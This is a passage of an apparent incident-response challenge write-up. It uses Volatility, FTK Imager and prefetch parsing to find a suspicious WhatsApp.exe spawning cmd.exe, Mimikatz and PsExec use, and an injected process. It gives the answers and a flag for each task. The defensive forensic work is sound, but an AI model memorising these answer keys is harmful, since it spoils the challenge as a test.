. 0xffff80061e12b080:services.exe                     616    472     28      0 2020-02-09 16:13:45 UTC+0000
.. 0xffff80061f74b780:TrustedInstall                 5516    616      8      0 2020-02-09 16:23:59 UTC+0000
.. 0xffff80061ed0f780:svchost.exe                    3212    616     31      0 2020-02-09 16:14:45 UTC+0000
.. 0xffff80061e04a780:NisSrv.exe                     3832    616      8      0 2020-02-09 16:15:11 UTC+0000
.. 0xffff80061e39b580:svchost.exe                    1168    616     29      0 2020-02-09 16:13:50 UTC+0000
.. 0xffff80061e461780:spoolsv.exe                    1556    616     17      0 2020-02-09 16:13:53 UTC+0000
.. 0xffff80061efff780:SearchIndexer.                 3632    616     18      0 2020-02-09 16:16:47 UTC+0000
.. 0xffff80061e42a080:svchost.exe                    1412    616      5      0 2020-02-09 16:13:52 UTC+0000
.. 0xffff80061e261780:svchost.exe                     924    616     81      0 2020-02-09 16:13:49 UTC+0000
... 0xffff80061cc33780:taskhostw.exe                  508    924     15      0 2020-02-09 16:17:26 UTC+0000
... 0xffff80061f0a4780:sihost.exe                    1080    924     19      0 2020-02-09 16:17:23 UTC+0000
.. 0xffff80061e4ca780:svchost.exe                    1696    616     21      0 2020-02-09 16:13:53 UTC+0000
.. 0xffff80061e57a780:SecurityHealth                 1968    616     11      0 2020-02-09 16:13:55 UTC+0000
.. 0xffff80061e4c4780:svchost.exe                    1668    616     22      0 2020-02-09 16:13:53 UTC+0000
.. 0xffff80061e1f9780:svchost.exe                     824    616     17      0 2020-02-09 16:13:47 UTC+0000
.. 0xffff80061e4ec780:svchost.exe                    1728    616     10      0 2020-02-09 16:13:53 UTC+0000
.. 0xffff80061e23a780:svchost.exe                     992    616     19      0 2020-02-09 16:13:49 UTC+0000
... 0xffff80061c874080:dasHost.exe                   3044    992     21      0 2020-02-09 16:14:37 UTC+0000
.. 0xffff80061e7a2780:VGAuthService.                 1592    616      4      0 2020-02-09 16:13:56 UTC+0000
.. 0xffff80061e149780:svchost.exe                     712    616     39      0 2020-02-09 16:13:46 UTC+0000
... 0xffff80061f73d080:smartscreen.ex                4588    712      7      0 2020-02-09 16:23:58 UTC+0000
... 0xffff80061eba0780:WmiPrvSE.exe                  1496    712     11      0 2020-02-09 16:14:37 UTC+0000
... 0xffff80061f3e5780:RuntimeBroker.                4448    712     20      0 2020-02-09 16:18:01 UTC+0000
... 0xffff80061ec5e700:WmiPrvSE.exe                  2724    712      9      0 2020-02-09 16:14:38 UTC+0000
... 0xffff80061f2d1780:ShellExperienc                4080    712     27      0 2020-02-09 16:17:59 UTC+0000
... 0xffff80061f5bd080:SkypeHost.exe                 4920    712      9      0 2020-02-09 16:18:06 UTC+0000
... 0xffff80061f6cf780:InstallAgent.e                5448    712      5      0 2020-02-09 16:19:02 UTC+0000
... 0xffff80061c872780:InstallAgentUs                5628    712      4      0 2020-02-09 16:19:03 UTC+0000
... 0xffff80061f2a9080:SearchUI.exe                  2828    712     31      0 2020-02-09 16:17:59 UTC+0000
... 0xffff80061e62a780:TiWorker.exe                  4568    712      7      0 2020-02-09 16:23:59 UTC+0000
.. 0xffff80061f0b8080:svchost.exe                    3532    616     18      0 2020-02-09 16:17:23 UTC+0000
.. 0xffff80061e2ef780:svchost.exe                     588    616     27      0 2020-02-09 16:13:50 UTC+0000
.. 0xffff80061e3fe080:svchost.exe                    1336    616     11      0 2020-02-09 16:13:52 UTC+0000
... 0xffff80061f6a5080:audiodg.exe                   5468   1336      8      0 2020-02-09 16:23:58 UTC+0000
.. 0xffff80061e2c7780:svchost.exe                     356    616     45      0 2020-02-09 16:13:50 UTC+0000
.. 0xffff80061e576380:MsMpEng.exe                    2012    616     31      0 2020-02-09 16:13:55 UTC+0000
.. 0xffff80061e782780:vmtoolsd.exe                   1252    616     11      0 2020-02-09 16:13:55 UTC+0000
.. 0xffff80061e2c5780:svchost.exe                     360    616     19      0 2020-02-09 16:13:50 UTC+0000
.. 0xffff80061ec14080:dllhost.exe                    2812    616     16      0 2020-02-09 16:14:35 UTC+0000
.. 0xffff80061e55e780:svchost.exe                    1900    616     15      0 2020-02-09 16:13:55 UTC+0000
.. 0xffff80061eb715c0:msdtc.exe                      3060    616     13      0 2020-02-09 16:14:37 UTC+0000
.. 0xffff80061e40c080:svchost.exe                    1404    616     11      0 2020-02-09 16:13:52 UTC+0000
 0xffff80061dcb5780:csrss.exe                         400    388     11      0 2020-02-09 16:13:44 UTC+0000
 0xffff80061f65e080:WhatsApp.exe                     5392   4524     37      0 2020-02-09 16:23:30 UTC+0000
. 0xffff80061f031780:WhatsApp.exe                    5612   5392      4      0 2020-02-09 16:23:34 UTC+0000
. 0xffff80061f70e080:WhatsApp.exe                    4816   5392     15      0 2020-02-09 16:23:34 UTC+0000
. 0xffff80061f613080:cmd.exe                         3352   5392      1      0 2020-02-09 16:23:34 UTC+0000
.. 0xffff80061f036080:conhost.exe                    4740   3352      1      0 2020-02-09 16:23:34 UTC+0000
. 0xffff80061f738080:WhatsApp.exe                    5496   5392      0 ------ 2020-02-09 16:23:49 UTC+0000
. 0xffff80061f61a080:WhatsApp.exe                    4116   5392     24      0 2020-02-09 16:23:40 UTC+0000
```

As we see that `WhatsApp.exe`  does not appear in baseline.dmp, but it appear in infected machine.

We can also find that the `cmd.exe` (PID 3352)'s parent process ID is belongs to Whatsapp.exe (PID 5392).


| Question | Answer |
| --- | --- |
| Process name |  `WhatsApp.exe`


# Meow

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-09-15-01-07.png)

## Solution:

By using FTK imager, I navigate to `C:\Windows\Prefetch` and investigate the prefetch, but there's nothing suspicious except `Powershell2.exe`.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-22-52-16.png)

Referring to this [writeup](https://malwarenailed.blogspot.com/2020/05/cynet-incident-response-challenge-2020.html?m=1), he use `prefetch-carve.py` to carve out prefetch artifacts.

```
prefetch-carve.py -f DC.001 -o output
```

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-22-50-52.png)

| Question | Answer |
| --- | --- |
| Executable name |  `MIMIKATZ.EXE`


# Insurance

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-09-17-44-15.png)

## Solution:

Navigate to prefetch folder at `D:\c\Windows\prefetch`, we can see a tool name `PSEXESVC.EXE` which are suspicious to me because `PSEXESVC.exe` were commonly used for lateral movement.

```
PECmd.exe -d "D:\c\Windows\prefetch" --csv "c:\Work"
```

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-23-15-35.png)

The last run timestamp as shown in the `.csv` output file

| Question | Answer |
| --- | --- |
| Timestamp | 2020-02-04 09:13



# Layers

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-10-01-53-34.png)


## Solution:

After a few hours checking out all `.csv` Autorunsc report, I found `PSEXESVC.exe` (commonly uses in lateral movement) was run based on Lannister Autorunsc report.


| Question | Answer |
| --- | --- |
| Computer name |  `Lannister` |
| Filename |  `PSEXESVC.exe` |

# Frog Find

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-10-03-21-17.png)


## Solution:

`volatility -f THEEYRIE.dmp --profile=Win10x64_17134 malfind`

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-10-03-21-54.png)

`volatility -f THEEYRIE.dmp --profile=Win10x64_17134 pstree`

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-10-03-23-32.png)

`volatility -f THEEYRIE.dmp --profile=Win10x64_17134 procdump -D dump/ -p 1996` and run `strings` into the executable and we can get the flag.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-10-03-24-45.png)

The flag is `Frog-FWGA142FS`

| Question | Answer |
| --- | --- |
| Flag |`Frog-FWGA142FS`


